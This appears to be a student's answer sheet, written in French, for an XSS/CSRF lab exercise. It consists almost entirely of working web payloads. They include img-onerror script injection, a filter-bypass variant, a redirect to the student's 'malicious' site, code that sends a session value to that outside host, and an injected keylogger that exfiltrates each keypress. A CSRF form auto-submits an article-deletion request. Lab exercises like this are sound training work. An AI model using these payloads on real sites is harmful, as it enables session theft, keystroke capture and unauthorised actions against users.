

Partie 1


Level 1 : 


1) https://xss-csrf-tp.herokuapp.com/level/1?page=%3Cimg%20src=%22rien%22%20onerror=%22alert(%27gros%hello%27)%22%3E

Level 2 :

 1)
<img src='zzz.jpg' onerror= alert('zebi') ></img>

2)
	Elles sont supprimées lors de l'envoi du formulaire, le code serveur doit vérifier leur présence à la reception dui formulaire pour les supprimer.'
		
3)

4)
<img src='zzz.jpg' onerror= window.location.replace("https://my-malicious-website-dherment.herokuapp.com/"); ></img>



5)
<img src="zzz.jpg" onerror="let img = document.createElement('IMG'); img.setAttribute('src','https://my-malicious-website-dherment.herokuapp.com?session=' + sessionStorage.getItem('SESSIONAVOLER')), document.body.appendChild(img)">

Level 3)

1) <i<img>mg  src='zzz.jpg' onerror= alert('zebi') />

2)  <img src="zzz.jpg" onerror="
    let pressed = '';             
    document.onkeypress = function (e) {
        pressed += e.key;
        let sendKeys = new XMLHttpRequest();
        sendKeys.open('GET','https://my-malicious-website-dherment.herokuapp.com/data=' + pressed, true); 
        sendKeys.setRequestHeader('Access-Control-Allow-Origin', '*');
    sendKeys.send('data=' + pressed);                
    }   
">

Partie 2 

1 ) 
mon site : https://my-malicious-website-dherment.herokuapp.com/ 
il marche après avoir galéré pcq j'avais pas les bons guillemets, merci les 2 points.

2) <form action="https://xss-csrf-tp.herokuapp.com/articles/delete" method="GET" id="formMechant"></form>
<script>
    window.addEventListener('load', function () {
        document.getElementById('formMechant').submit();
    });
</script> 

3) flemme
